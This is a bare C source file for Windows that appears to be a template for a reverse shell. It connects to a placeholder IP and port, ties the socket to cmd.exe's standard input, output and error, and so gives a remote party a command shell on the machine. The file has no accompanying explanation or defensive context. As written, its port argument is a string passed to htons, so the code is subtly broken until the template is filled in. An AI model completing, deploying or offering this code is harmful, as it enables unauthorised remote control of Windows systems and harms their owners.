#include <winsock2.h>
#include <windows.h>

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("{{IP}}"); 
    server.sin_port = htons("{{{PORT}}}");                     

    WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    ZeroMemory(&sui, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &sui, &pi);
}